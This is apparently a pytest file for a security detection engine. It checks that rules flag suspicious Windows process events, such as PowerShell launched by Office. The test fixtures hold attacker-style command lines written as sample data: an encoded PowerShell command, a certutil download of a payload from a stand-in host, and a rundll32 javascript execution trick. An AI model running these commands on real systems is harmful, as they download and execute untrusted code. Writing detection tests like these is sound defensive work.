from datetime import datetime, timezone

from app.detections import DetectionResult, run_detections
from app.normalization import NormalizedEvent


def _event(
    *,
    process_name: str,
    parent_process: str | None = None,
    command_line: str | None = None,
) -> NormalizedEvent:
    return NormalizedEvent(
        timestamp=datetime(2026, 6, 23, 4, 15, 30, tzinfo=timezone.utc),
        host="workstation-01",
        user="ACME\\alice",
        process_name=process_name,
        parent_process=parent_process,
        command_line=command_line,
        hash_sha256=None,
        event_type="process_creation",
        source="sysmon",
    )


def test_detects_encoded_powershell_command() -> None:
    event = _event(
        process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        command_line="powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
    )

    results = run_detections(event)

    assert [result.rule_id for result in results] == ["TH-PS-001"]
    assert isinstance(results[0], DetectionResult)
    assert results[0].severity == "high"


def test_detects_office_spawning_powershell() -> None:
    event = _event(
        process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_process="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        command_line="powershell.exe -NoProfile",
    )

    results = run_detections(event)

    assert [result.rule_id for result in results] == ["TH-OFFICE-001"]


def test_detects_certutil_download_behavior() -> None:
    event = _event(
        process_name="C:\\Windows\\System32\\certutil.exe",
        command_line="certutil.exe -urlcache -split -f https://example.test/payload.exe payload.exe",
    )

    results = run_detections(event)

    assert [result.rule_id for result in results] == ["TH-CERTUTIL-001"]


def test_detects_rundll32_suspicious_execution() -> None:
    event = _event(
        process_name="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
    )

    results = run_detections(event)

    assert [result.rule_id for result in results] == ["TH-RUNDLL32-001"]


def test_detection_engine_returns_all_matching_results() -> None:
    event = _event(
        process_name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        parent_process="C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
        command_line="powershell.exe -enc SQBFAFgA",
    )

    results = run_detections(event)

    assert [result.rule_id for result in results] == ["TH-PS-001", "TH-OFFICE-001"]


def test_detection_engine_returns_empty_list_when_no_rules_match() -> None:
    event = _event(
        process_name="C:\\Windows\\System32\\notepad.exe",
        parent_process="C:\\Windows\\explorer.exe",
        command_line="notepad.exe",
    )

    assert run_detections(event) == []
